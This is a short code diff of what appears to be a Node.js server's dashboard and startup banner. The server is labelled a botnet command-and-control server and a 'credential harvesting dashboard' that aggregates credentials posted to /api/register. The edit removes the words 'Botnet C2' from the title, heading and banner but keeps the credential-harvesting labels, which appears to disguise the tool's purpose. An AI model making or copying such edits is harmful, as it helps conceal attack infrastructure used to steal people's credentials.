@@ -548,7 +548,7 @@ app.get('/', (req, res) => {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Botnet C2 Server</title>
+    <title>  Server</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
@@ -589,7 +589,7 @@ app.get('/', (req, res) => {
 </head>
 <body>
 <div class="container">
-    <h1>🕸️ Botnet C2 Server</h1>
+    <h1>🕸️   Server</h1>
     <div class="subtitle">Credential harvesting dashboard — POST /api/register</div>
     
     <div class="grid" id="stats">
@@ -727,7 +727,7 @@ loadCredentials();
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n╔══════════════════════════════════════════╗`);
-    console.log(`║     BOTNET C2 SERVER v1.0              ║`);
+    console.log(`║       SERVER v1.0              ║`);
     console.log(`║     Credential Aggregator               ║`);
     console.log(`╚══════════════════════════════════════════╝\n`);
     console.log(`🚀 Server running on port ${PORT}`);
